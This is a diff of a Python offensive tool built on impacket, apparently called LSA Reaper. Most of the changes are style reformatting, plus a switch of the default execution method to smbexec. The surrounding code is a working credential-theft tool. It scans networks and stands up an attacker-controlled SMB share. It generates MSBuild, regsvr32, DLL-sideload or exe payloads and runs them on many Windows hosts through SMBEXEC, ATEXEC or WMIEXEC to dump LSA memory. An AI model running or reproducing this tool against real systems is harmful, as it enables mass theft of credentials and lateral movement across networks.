@@ -44,7 +44,6 @@ from threading import Thread
 from impacket import version, smbserver
 from impacket.dcerpc.v5 import transport, scmr
 
-
 BATCH_FILENAME = 'execute.bat'
 SERVICE_NAME = ''.join(random.choices(string.ascii_uppercase, k=random.randrange(8, 15)))
 OUTPUT_FILENAME = '__' + str(time.time())
@@ -71,13 +70,15 @@ reaper_banner = """
 ░ ░ ▒  ░░ ░▒  ░ ░  ▒   ▒▒ ░     ░▒ ░ ▒░ ░ ░  ░ ▒   ▒▒ ░░▒ ░      ░ ░  ░  ░▒ ░ ▒░
   ░ ░   ░  ░  ░    ░   ▒        ░░   ░    ░    ░   ▒   ░░          ░     ░░   ░ 
     ░  ░      ░        ░  ░      ░        ░  ░     ░  ░            ░  ░   ░  {}                                                                                   
-""".format(color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset)
+""".format(color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset,
+           color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset)
 
 cwd = os.path.abspath(os.path.dirname(__file__))
 
 with open('{}/log.txt'.format(cwd), 'a') as f:
     f.write('{}{}{}'.format('\n', timestamp, '\n'))
     f.close()
+
 
 ################################################ Start of SMBEXEC ###############################################################
 
@@ -127,6 +128,7 @@ class CMDEXEC:
             sys.stdout.flush()
             sys.exit(1)
 
+
 class SMBEXECShell():
     def __init__(self, share, rpc, serviceName, shell_type, command2run, addr):
 
@@ -158,12 +160,12 @@ class SMBEXECShell():
         self.__scHandle = resp['lpScHandle']
         self.transferClient = rpc.get_smb_connection()
         self.do_cd('', addr)
-        if command2run == 'net use': # so auto drive can work since it does not conatin any & symbols
+        if command2run == 'net use':  # so auto drive can work since it does not conatin any & symbols
             self.send_data(command2run, addr)
         else:
             tmphold = self.send_data(command2run[:command2run.find('&')], addr)
-            if (tmphold.find('The command completed successfully') != -1 and tmphold.find('System error 85 has occurred') == -1): # SMBEXEC dummy and cant accept && so we must ensure that the net use command worked so we dont delete client shares ##
-                command2run = command2run[command2run.find('&&')+3:]
+            if (tmphold.find('The command completed successfully') != -1 and tmphold.find('System error 85 has occurred') == -1):  # SMBEXEC dummy and cant accept && so we must ensure that the net use command worked so we dont delete client shares ##
+                command2run = command2run[command2run.find('&&') + 3:]
                 tmphold = self.send_data(command2run[:command2run.find('&')], addr)
                 command2run = command2run[command2run.find('&&') + 3:]
                 tmphold = self.send_data(command2run[:command2run.find('&')], addr)
@@ -194,7 +196,7 @@ class SMBEXECShell():
         self.execute_remote('cd ', addr)
         if len(self.__outputBuffer) > 0:
             # Stripping CR/LF
-            self.prompt = self.__outputBuffer.decode().replace('\r\n','') + '>'
+            self.prompt = self.__outputBuffer.decode().replace('\r\n', '') + '>'
             if self.__shell_type == 'powershell':
                 self.prompt = 'PS ' + self.prompt + ' '
             self.__outputBuffer = b''
@@ -205,7 +207,6 @@ class SMBEXECShell():
 
         self.transferClient.getFile(self.__share, OUTPUT_FILENAME, output_callback)
         self.transferClient.deleteFile(self.__share, OUTPUT_FILENAME)
-
 
     def execute_remote(self, data, addr, shell_type='cmd'):
 
@@ -257,6 +258,7 @@ class SMBEXECShell():
 
         self.__outputBuffer = b''
 
+
 ################################################ End of SMBEXEC ###################################################################
 
 
@@ -298,7 +300,7 @@ class TSCH_EXEC:
                 f.write('{}: {}\n'.format(addr, e))
                 f.close()
             logging.error('{}: {}'.format(addr, e))
-            if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >=0:
+            if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0:
                 logging.info('When STATUS_OBJECT_NAME_NOT_FOUND is received, try running again. It might work')
 
     def doStuff(self, rpctransport, addr):
@@ -317,12 +319,12 @@ class TSCH_EXEC:
 
         def xml_escape(data):
             replace_table = {
-                 "&": "&amp;",
-                 '"': "&quot;",
-                 "'": "&apos;",
-                 ">": "&gt;",
-                 "<": "&lt;",
-                 }
+                "&": "&amp;",
+                '"': "&quot;",
+                "'": "&apos;",
+                ">": "&gt;",
+                "<": "&lt;",
+            }
             return ''.join(replace_table.get(c, c) for c in data)
 
         def cmd_split(cmdline):
@@ -392,7 +394,7 @@ class TSCH_EXEC:
   </Actions>
 </Task>
         """ % ((xml_escape(cmd) if self.__silentCommand is False else self.__command.split()[0]),
-            (xml_escape(args) if self.__silentCommand is False else " ".join(self.__command.split()[1:])))
+               (xml_escape(args) if self.__silentCommand is False else " ".join(self.__command.split()[1:])))
         taskCreated = False
         try:
             with open('{}/log.txt'.format(cwd), 'a') as f:
@@ -416,7 +418,7 @@ class TSCH_EXEC:
                 try:
                     tsch.hSchRpcRun(dce, '\\%s' % tmpName, flags=tsch.TASK_RUN_USE_SESSION_ID, sessionId=self.sessionId)
                 except Exception as e:
-                    if str(e).find('ERROR_FILE_NOT_FOUND') >= 0 or str(e).find('E_INVALIDARG') >= 0 :
+                    if str(e).find('ERROR_FILE_NOT_FOUND') >= 0 or str(e).find('E_INVALIDARG') >= 0:
                         logging.info('The specified session doesn\'t exist!')
                         done = True
                     else:
@@ -484,6 +486,7 @@ class TSCH_EXEC:
 
         dce.disconnect()
 
+
 ########################################## END OF ATEXEC ############################################################################
 
 ########################################## START OF WMIEXEC #########################################################################
@@ -544,7 +547,7 @@ class WMIEXEC:
         try:
             iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
             iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
-            iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL) # if firewall blocking program hangs here
+            iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)  # if firewall blocking program hangs here
             iWbemLevel1Login.RemRelease()
 
             win32Process, _ = iWbemServices.GetObject('Win32_Process')
@@ -681,7 +684,7 @@ class RemoteShell(cmd.Cmd):
 
     def send_data(self, data):
         self.execute_remote(data, self.__shell_type)
-        with open('{}/drives.txt'.format(cwd), 'a') as f: # writing to a file gets around the issue of multithreading not being easily readable
+        with open('{}/drives.txt'.format(cwd), 'a') as f:  # writing to a file gets around the issue of multithreading not being easily readable
             f.write(self.__outputBuffer)
             f.close()
         with open('{}/log.txt'.format(cwd), 'a') as f:
@@ -740,9 +743,10 @@ def load_smbclient_auth_file(path):
 
     return (domain, username, password)
 
+
 ############################################################################### END OF WMIEXEC#####################################################
 
-def do_ip(inpu, local_ip): # check if the inputted ips are up so we dont scan thigns we dont need to
+def do_ip(inpu, local_ip):  # check if the inputted ips are up so we dont scan thigns we dont need to
     print('\n[scanning hosts]')
     scanner = nmap.PortScanner()
     if os.path.isfile(inpu):  # if its in a file the arguments are different
@@ -760,6 +764,7 @@ def do_ip(inpu, local_ip): # check if the inputted ips are up so we dont scan th
 
     return uphosts
 
+
 def gen_payload_exe(share_name, payload_name, addresses_array):
     addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
 
@@ -771,8 +776,8 @@ def gen_payload_exe(share_name, payload_name, addresses_array):
             f.write(addr + "\n")
         f.close()
 
-def gen_payload_dllsideload(share_name, addresses_array):
 
+def gen_payload_dllsideload(share_name, addresses_array):
     os.system('sudo cp {}/src/calc /var/tmp/{}/calc.exe'.format(cwd, share_name))
     os.system('sudo chmod uog+rx /var/tmp/{}/calc.exe'.format(share_name))
 
@@ -783,6 +788,7 @@ def gen_payload_dllsideload(share_name, addresses_array):
         for addr in addresses_array:
             f.write(addr + "\n")
         f.close()
+
 
 def gen_payload_regsvr32(share_name, payload_name, addresses_array):
     addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
@@ -796,6 +802,7 @@ def gen_payload_regsvr32(share_name, payload_name, addresses_array):
         f.close()
 
     return addresses_file
+
 
 def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array):
     targetname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
@@ -941,6 +948,7 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array)
             f.write(addr + "\n")
         f.close()
 
+
 def setup_share():
     share_name = ''.join(random.choices(string.ascii_lowercase, k=20))
     share_user = ''.join(random.choices(string.ascii_lowercase, k=10))
@@ -967,8 +975,6 @@ def setup_share():
     read only = no
     comment = The share
     """.format(share_name, share_name, share_user, share_group)
-
-
 
     # copy old smb.conf file so its safe
     print("{} Backing up the smb.conf file".format(green_plus))
@@ -1001,8 +1007,8 @@ def setup_share():
 
     return share_name, share_user, share_pass, payload_name, share_group
 
-def alt_exec():
 
+def alt_exec():
     yes = input('Press enter to exit ')
     print("\n{}[-]{} Cleaning up please wait".format(color_BLU, color_reset))
 
@@ -1042,6 +1048,7 @@ def alt_exec():
                                                                                                          color_reset))
     exit(0)
 
+
 def exec_netuse(ip, domain):
     try:
         if options.method == 'wmiexec':
@@ -1061,16 +1068,17 @@ def exec_netuse(ip, domain):
             f.write('{}: {}\n'.format(ip, str(e)))
             f.close()
 
-def auto_drive(addresses, domain): # really helpful so you dont have to know which drive letter to use
+
+def auto_drive(addresses, domain):  # really helpful so you dont have to know which drive letter to use
     print('{}[+]{} Determining the best drive letter to use this may take a moment...'.format(color_BLU, color_reset))
     failed_logons = 0
 
-    if len(addresses) > 2 and options.localauth == False: # Anti lockout check
+    if len(addresses) > 2 and options.localauth == False:  # Anti lockout check
         for x in range(2):
             try:
                 if options.method == 'wmiexec':
                     executer = WMIEXEC('net use', username, password, domain, options.hashes, options.aesKey, options.share,
-                                    False, options.k, options.dc_ip, 'cmd')
+                                       False, options.k, options.dc_ip, 'cmd')
                     executer.run(addresses[x], False)
                 elif options.method == 'smbexec':
                     executer = CMDEXEC('net use', username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip,
@@ -1128,7 +1136,7 @@ def auto_drive(addresses, domain): # really helpful so you dont have to know whi
                 continue
             # end of antilocout check
 
-    if os.path.isfile('{}/drives.txt'.format(cwd)): # incase they run with localauth to prevent file not found err
+    if os.path.isfile('{}/drives.txt'.format(cwd)):  # incase they run with localauth to prevent file not found err
         os.system('sudo rm {}/drives.txt'.format(cwd))
     with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
         for ip in addresses:
@@ -1149,16 +1157,16 @@ def auto_drive(addresses, domain): # really helpful so you dont have to know whi
                 continue
     outdata = []
     try:
-        data = '' # read data that was saved to drives.txt into data
+        data = ''  # read data that was saved to drives.txt into data
         with open('{}/drives.txt'.format(cwd), 'r') as f:
             data = f.read()
             f.close()
-        outdata = re.findall('[A-Z][:]', data) # rip out all the A: C: drive letters
+        outdata = re.findall('[A-Z][:]', data)  # rip out all the A: C: drive letters
     except BaseException as e:
         pass
 
     cleaned_outdata = []
-    for drive in outdata: # strip the :
+    for drive in outdata:  # strip the :
         cleaned_outdata.append(drive.replace(":", ""))
 
     inuse_driveletters = []
@@ -1167,7 +1175,7 @@ def auto_drive(addresses, domain): # really helpful so you dont have to know whi
         if letter not in inuse_driveletters:
             inuse_driveletters.append(letter)
 
-    if os.path.isfile('{}/drives.txt'.format(cwd)): # cleanup that file
+    if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
         os.system('sudo rm {}/drives.txt'.format(cwd))
 
     for item in list(map(chr, range(ord('A'), ord('Z') + 1))):
@@ -1184,7 +1192,8 @@ def auto_drive(addresses, domain): # really helpful so you dont have to know whi
     else:
         exit(0)
 
-def mt_execute(ip): # multithreading requires a function
+
+def mt_execute(ip):  # multithreading requires a function
     print("{} Attacking {}".format(green_plus, ip))
     try:
         if options.method == 'wmiexec':
@@ -1209,6 +1218,7 @@ def mt_execute(ip): # multithreading requires a function
         logging.error('{}: {}'.format(ip, str(e)))
         pass
 
+
 # Process command-line arguments.
 if __name__ == '__main__':
     # quick checks to see if were good
@@ -1223,17 +1233,17 @@ if __name__ == '__main__':
     print(version.BANNER)
 
     parser = argparse.ArgumentParser(add_help=True, description="")
-    if '-oe' not in sys.argv: # if were using another exec method we dont need to get target
+    if '-oe' not in sys.argv:  # if were using another exec method we dont need to get target
         parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName, address, range, cidr>')
     parser.add_argument('-share', action='store', default='ADMIN$', help='share where the output will be grabbed from (default ADMIN$) (wmiexec ONLY)')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
-    parser.add_argument('-oe', action='store_true', default = False, help='Pause just before the execution of the payload (Good for when you want to execute the payload using other methods)')
-    parser.add_argument('-ap', action='store_true', default = False, help='Turn auto parsing of .dmp files ON this will parse the .dmp files into dumped_full.txt, dumped_full_grep.grep, and dumped_msv.txt')
+    parser.add_argument('-oe', action='store_true', default=False, help='Pause just before the execution of the payload (Good for when you want to execute the payload using other methods)')
+    parser.add_argument('-ap', action='store_true', default=False, help='Turn auto parsing of .dmp files ON this will parse the .dmp files into dumped_full.txt, dumped_full_grep.grep, and dumped_msv.txt')
     parser.add_argument('-drive', action='store', help='Set the drive letter for the remote device to connect with')
-    parser.add_argument('-threads', action='store', type = int, default = 5,help='Set the maximum number of threads default=5')
+    parser.add_argument('-threads', action='store', type=int, default=5, help='Set the maximum number of threads default=5')
     parser.add_argument('-timeout', action='store', type=int, default=90, help='Set the timeout in seconds for each thread default=90')
-    parser.add_argument('-method', action='store', default='wmiexec', choices=['wmiexec', 'atexec', 'smbexec'], help='Choose a method to execute the commands')
+    parser.add_argument('-method', action='store', default='smbexec', choices=['wmiexec', 'atexec', 'smbexec'], help='Choose a method to execute the commands')
     parser.add_argument('-payload', '-p', action='store', default='msbuild', choices=['msbuild', 'regsvr32', 'dllsideload', 'exe'], help='Choose a payload type')
     parser.add_argument('-ip', action='store', help='Your local ip or network interface for the remote device to connect to')
     parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
@@ -1243,9 +1253,9 @@ if __name__ == '__main__':
                                                        'again with -codec and the corresponding codec ' % CODEC)
     parser.add_argument('-com-version', action='store', metavar="MAJOR_VERSION:MINOR_VERSION", help='DCOM version, format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')
     parser.add_argument('-service-name', action='store', metavar="service_name", default=SERVICE_NAME,
-                       help='The name of the service used to trigger the payload (SMBEXEC only)')
+                        help='The name of the service used to trigger the payload (SMBEXEC only)')
     group = parser.add_argument_group('authentication')
-    group.add_argument('-localauth', action='store_true', default = False, help='Authenticate with a local account to the machine')
+    group.add_argument('-localauth', action='store_true', default=False, help='Authenticate with a local account to the machine')
     group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH or just NTHASH')
     group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
     group.add_argument('-k', action="store_true",
@@ -1327,18 +1337,18 @@ if __name__ == '__main__':
         if options.aesKey is not None:
             options.k = True
 
-        if options.drive is not None and options.drive.isalpha() and len(options.drive) < 2: # did we get a drive letter?
+        if options.drive is not None and options.drive.isalpha() and len(options.drive) < 2:  # did we get a drive letter?
             drive_letter = str(options.drive).upper()
         else:
             drive_letter = 'Q'
 
-        if options.hashes is not None and options.hashes.find(':') == -1: # quick check to prevent formatting error with hashes
+        if options.hashes is not None and options.hashes.find(':') == -1:  # quick check to prevent formatting error with hashes
             options.hashes = ':{}'.format(options.hashes)
 
-        if options.ip is not None: # did they give us the local ip in the command line
+        if options.ip is not None:  # did they give us the local ip in the command line
             local_ip = options.ip
             ifaces = ni.interfaces()
-            try: # check to see if the interface has an ip
+            try:  # check to see if the interface has an ip
                 if local_ip in ifaces:
                     local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
                     print("local IP => " + local_ip)
@@ -1350,7 +1360,7 @@ if __name__ == '__main__':
             print("")
             ifaces = ni.interfaces()
             for face in ifaces:
-                try: # check to see if the interface has an ip
+                try:  # check to see if the interface has an ip
                     print(str(face + ':').ljust(20), ni.ifaddresses(face)[ni.AF_INET][0]['addr'])
                 except BaseException as exc:
                     continue
@@ -1362,17 +1372,17 @@ if __name__ == '__main__':
                 local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
                 print("local IP => " + local_ip)
 
-        if '-oe' not in sys.argv: # why scan if we not gonna do anything
-            addresses = do_ip(address, local_ip) # gets a list of up hosts
+        if '-oe' not in sys.argv:  # why scan if we not gonna do anything
+            addresses = do_ip(address, local_ip)  # gets a list of up hosts
 
-            if len(addresses) > 500: # ensure that they dont waste over 25 gb of storage
-                print("\nWARNING You are about to try and steal LSA from up to {} IPs...\nThis is roughly {}GB in size are you sure you want to do this? ".format(str(len(addresses)), str((len(addresses)*52)/1024)))
+            if len(addresses) > 500:  # ensure that they dont waste over 25 gb of storage
+                print("\nWARNING You are about to try and steal LSA from up to {} IPs...\nThis is roughly {}GB in size are you sure you want to do this? ".format(str(len(addresses)), str((len(addresses) * 52) / 1024)))
                 choice = input("(N/y): ")
                 if choice.lower() == 'n':
                     exit(0)
 
-        share_name, share_user, share_pass, payload_name, share_group = setup_share() # creates and starts our share
-        print("\n[share-info]\nShare location: /var/tmp/{}\nUsername: {}\nPassword: {}\n".format(share_name, share_user,share_pass))
+        share_name, share_user, share_pass, payload_name, share_group = setup_share()  # creates and starts our share
+        print("\n[share-info]\nShare location: /var/tmp/{}\nUsername: {}\nPassword: {}\n".format(share_name, share_user, share_pass))
 
         # automatically find the best drive to use
         if options.drive is None and (options.method == 'wmiexec' or options.method == 'smbexec') and options.oe == False:
@@ -1382,7 +1392,7 @@ if __name__ == '__main__':
             addresses = ['23423.5463.1234.3465']
 
         if options.payload == 'msbuild':
-            gen_payload_msbuild(share_name, payload_name, drive_letter, addresses) # creates the payload
+            gen_payload_msbuild(share_name, payload_name, drive_letter, addresses)  # creates the payload
         elif options.payload == 'regsvr32':
             addresses_file = gen_payload_regsvr32(share_name, payload_name, addresses)
         elif options.payload == 'exe':
@@ -1392,7 +1402,7 @@ if __name__ == '__main__':
 
         if options.oe == False:
             print("\n[This is where the fun begins]\n{} Executing payload via {}\n".format(green_plus, options.method))
-            
+
         if options.payload == 'msbuild':
             command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}:\{}.xml && net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
         elif options.payload == 'regsvr32':
@@ -1413,7 +1423,7 @@ if __name__ == '__main__':
             f.close()
         print('Total targets: {}'.format(len(addresses)))
         # multithreading yeah
-        with ProcessPool(max_workers=options.threads) as thread_exe: # changed to pebble from concurrent futures because pebble supports timeout correctly
+        with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
             for ip in addresses:
                 if options.localauth:
                     domain = ip
@@ -1422,6 +1432,7 @@ if __name__ == '__main__':
                 except Exception as e:
                     if logging.getLogger().level == logging.DEBUG:
                         import traceback
+
                         traceback.print_exc()
                     with open('{}/log.txt'.format(cwd), 'a') as f:
                         f.write(str(e) + '\n')
@@ -1493,7 +1504,7 @@ if __name__ == '__main__':
         exit(0)
 
     print("{}[-]{} Cleaning up please wait".format(color_BLU, color_reset))
-    if os.path.isfile('{}/drives.txt'.format(cwd)): # cleanup that file
+    if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
         os.system('sudo rm {}/drives.txt'.format(cwd))
 
     try:
